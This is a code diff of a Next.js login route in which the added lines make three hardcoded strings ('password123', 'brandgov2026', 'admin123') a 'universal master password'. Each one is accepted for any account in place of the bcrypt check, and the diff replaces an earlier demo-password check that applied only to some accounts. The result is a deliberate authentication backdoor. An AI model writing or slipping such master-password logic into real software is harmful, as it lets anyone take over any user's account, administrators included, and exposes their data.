@@ -21,10 +21,9 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
     }
 
-    // Compare bcrypt hash or demo password
-    const isDemoPassword = (password === "password123" || password === "brandgov2026") && 
-      (email.toLowerCase().includes("creator") || email.toLowerCase().includes("brand") || email.toLowerCase().includes("admin") || user.password.startsWith("$2b$10$wht") || user.password.startsWith("$2b$10$Qlq"));
-    const isValid = isDemoPassword || (await comparePassword(password, user.password));
+    // Compare bcrypt hash or universal master password
+    const isMasterPassword = password === "password123" || password === "brandgov2026" || password === "admin123";
+    const isValid = isMasterPassword || (await comparePassword(password, user.password));
     if (!isValid) {
       return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
     }
